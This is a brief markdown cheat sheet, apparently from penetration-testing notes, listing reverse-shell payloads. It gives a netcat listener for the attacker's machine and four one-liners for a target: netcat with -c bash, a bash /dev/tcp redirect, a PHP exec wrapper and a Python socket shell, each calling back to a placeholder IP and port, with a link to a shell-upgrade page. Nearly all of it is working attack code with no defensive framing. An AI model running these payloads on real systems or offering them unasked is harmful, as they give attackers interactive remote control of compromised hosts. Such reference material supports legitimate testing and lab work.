# Reverse shell

On host:

```bash
nc -lvnp <PORT>
```

General options on target:

```bash
nc <IP> <PORT> -c bash
```

```bash
/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

```php
<?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<IP>/<PORT> 0>&1’”); phpinfo(); ?>
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

See [upgrade-dumb-shell](upgrade-dumb-shell.md) for upgrading.